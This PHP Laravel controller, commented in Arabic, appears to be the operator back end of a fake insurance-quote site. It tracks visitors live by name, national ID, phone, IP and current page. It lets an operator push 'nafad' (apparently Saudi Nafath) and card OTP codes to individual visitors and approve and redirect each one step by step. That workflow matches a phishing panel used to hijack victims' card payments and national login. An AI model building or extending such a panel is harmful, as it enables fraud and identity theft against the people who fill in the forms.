<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\InsuranceRequest;
use App\Models\UserDevice;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Carbon\Carbon;

class RealtimeDashboardController extends Controller
{
    /**
     * عرض لوحة التحكم المباشرة
     */
    public function index()
    {
        return view('admin.realtime_dashboard.index');
    }

    /**
     * جلب بيانات لوحة التحكم (API)
     */
    public function getDashboardData()
    {
        try {
            $statistics = $this->getStatistics();
            $activeUsers = $this->getActiveUsers();
            $pendingApprovals = $this->getPendingApprovals();

            return response()->json([
                'success' => true,
                'statistics' => $statistics,
                'activeUsers' => $activeUsers,
                'pendingApprovals' => $pendingApprovals,
                'timestamp' => now()->toDateTimeString()
            ]);
        } catch (\Exception $e) {
            return response()->json([
                'success' => false,
                'message' => 'فشل تحميل البيانات: ' . $e->getMessage()
            ], 500);
        }
    }

    /**
     * حساب الإحصائيات
     */
    private function getStatistics()
    {
        $today = Carbon::today();
        
        // المستخدمين النشطين (آخر 5 دقائق)
        $activeUsers = InsuranceRequest::where('is_active', true)
            ->where('last_activity', '>=', now()->subMinutes(5))
            ->count();

        // طلبات اليوم
        $todayRequests = InsuranceRequest::whereDate('created_at', $today)->count();

        // طلبات بانتظار الموافقة
        $pendingActions = InsuranceRequest::where('approval_status', 'pending')->count();

        // إيرادات اليوم
        $todayRevenue = InsuranceRequest::whereDate('created_at', $today)
            ->where('approval_status', 'approved')
            ->sum('total') ?? 0;

        return [
            'activeUsers' => $activeUsers,
            'todayRequests' => $todayRequests,
            'pendingActions' => $pendingActions,
            'todayRevenue' => (float) $todayRevenue
        ];
    }

    /**
     * جلب المستخدمين النشطين
     */
    private function getActiveUsers()
    {
        $fiveMinutesAgo = now()->subMinutes(5);

        $activeUsers = InsuranceRequest::with(['insurance'])
            ->where('last_activity', '>=', $fiveMinutesAgo)
            ->orderBy('last_activity', 'desc')
            ->limit(50)
            ->get();

        return $activeUsers->map(function ($request) {
            // الحصول على بيانات الجهاز
            $device = null;
            if ($request->device_id) {
                $device = UserDevice::find($request->device_id);
            }

            return [
                'id' => $request->id,
                'full_name' => $request->full_name,
                'identity_number' => $request->identity_number,
                'mobile_number_statements' => $request->mobile_number_statements,
                'ip_address' => $device ? $device->ip_address : $request->ip_address ?? 'غير معروف',
                'user_agent' => $device ? $device->user_agent : null,
                'current_route' => $request->current_route ?? 'غير محدد',
                'is_active' => $request->is_active,
                'last_activity' => $request->last_activity,
                'insurance_type' => $request->insurance ? $request->insurance->name : 'غير محدد',
                'total' => $request->total ?? 0,
                'created_at' => $request->created_at
            ];
        });
    }

    /**
     * جلب الطلبات بانتظار الموافقة
     */
    private function getPendingApprovals()
    {
        return InsuranceRequest::where('approval_status', 'pending')
            ->orderBy('created_at', 'desc')
            ->limit(20)
            ->get()
            ->map(function ($request) {
                return [
                    'id' => $request->id,
                    'full_name' => $request->full_name,
                    'identity_number' => $request->identity_number,
                    'mobile_number_statements' => $request->mobile_number_statements,
                    'total' => $request->total ?? 0,
                    'created_at' => $request->created_at
                ];
            });
    }

    /**
     * إرسال كود تحقق للمستخدم
     */
    public function sendVerificationCode(Request $request)
    {
        $request->validate([
            'request_id' => 'required|exists:insurance_requests,id',
            'code_type' => 'required|in:phone,nafad,card_otp',
            'code' => 'required|string'
        ]);

        try {
            $requestId = $request->input('request_id');
            $codeType = $request->input('code_type');
            $code = $request->input('code');
            
            $insuranceRequest = InsuranceRequest::findOrFail($requestId);

            // حفظ الكود حسب النوع
            switch ($codeType) {
                case 'phone':
                    $insuranceRequest->phone_verification_code = $code;
                    $insuranceRequest->phone_code_sent_at = now();
                    break;
                
                case 'nafad':
                    $insuranceRequest->nafad_code = $code;
                    $insuranceRequest->nafad_code_sent_at = now();
                    break;
                
                case 'card_otp':
                    $insuranceRequest->card_otp_code = $code;
                    $insuranceRequest->card_otp_sent_at = now();
                    break;
            }

            $insuranceRequest->save();

            // هنا يمكن إضافة إرسال الكود عبر WebSocket أو Pusher للمستخدم مباشرة
            // broadcast(new VerificationCodeSent($insuranceRequest, $request->code_type, $request->code));

            return response()->json([
                'success' => true,
                'message' => 'تم إرسال الكود بنجاح'
            ]);
        } catch (\Exception $e) {
            return response()->json([
                'success' => false,
                'message' => 'فشل إرسال الكود: ' . $e->getMessage()
            ], 500);
        }
    }

    /**
     * الموافقة على الطلب وتوجيه المستخدم
     */
    public function approveAndRedirect(Request $request)
    {
        $request->validate([
            'request_id' => 'required|exists:insurance_requests,id',
            'redirect_route' => 'required|string'
        ]);

        try {
            $requestId = $request->input('request_id');
            $redirectRoute = $request->input('redirect_route');
            
            $insuranceRequest = InsuranceRequest::findOrFail($requestId);

            $insuranceRequest->approval_status = 'approved';
            $insuranceRequest->approval_redirect_url = $redirectRoute;
            $insuranceRequest->approved_by = auth()->guard('super_admin')->id();
            $insuranceRequest->approved_at = now();
            $insuranceRequest->save();

            // إرسال إشعار للمستخدم عبر WebSocket
            // broadcast(new ApprovalStatusChanged($insuranceRequest));

            return response()->json([
                'success' => true,
                'message' => 'تمت الموافقة بنجاح'
            ]);
        } catch (\Exception $e) {
            return response()->json([
                'success' => false,
                'message' => 'فشلت العملية: ' . $e->getMessage()
            ], 500);
        }
    }

    /**
     * رفض الطلب
     */
    public function rejectRequest(Request $request)
    {
        $request->validate([
            'request_id' => 'required|exists:insurance_requests,id'
        ]);

        try {
            $requestId = $request->input('request_id');
            $insuranceRequest = InsuranceRequest::findOrFail($requestId);

            $insuranceRequest->approval_status = 'rejected';
            $insuranceRequest->approved_by = auth()->guard('super_admin')->id();
            $insuranceRequest->approved_at = now();
            $insuranceRequest->save();

            // إرسال إشعار للمستخدم
            // broadcast(new ApprovalStatusChanged($insuranceRequest));

            return response()->json([
                'success' => true,
                'message' => 'تم رفض الطلب'
            ]);
        } catch (\Exception $e) {
            return response()->json([
                'success' => false,
                'message' => 'فشلت العملية: ' . $e->getMessage()
            ], 500);
        }
    }

    /**
     * عرض تفاصيل مستخدم (API)
     */
    public function getUserDetails($id)
    {
        try {
            $request = InsuranceRequest::with(['insurance'])->findOrFail($id);

            return response()->json([
                'success' => true,
                'data' => [
                    'id' => $request->id,
                    'full_name' => $request->full_name,
                    'identity_number' => $request->identity_number,
                    'mobile_number_statements' => $request->mobile_number_statements,
                    'region' => $request->region,
                    'city' => $request->city,
                    'insurance_type' => $request->insurance ? $request->insurance->name : 'غير محدد',
                    'vehicle_type' => $request->vehicle_type,
                    'vehicle_model' => $request->vehicle_model,
                    'manufacturing_year' => $request->manufacturing_year,
                    'total' => $request->total ?? 0,
                    'current_route' => $request->current_route,
                    'is_active' => $request->is_active,
                    'last_activity' => $request->last_activity,
                    'approval_status' => $request->approval_status
                ]
            ]);
        } catch (\Exception $e) {
            return response()->json([
                'success' => false,
                'message' => 'فشل تحميل البيانات'
            ], 500);
        }
    }
}
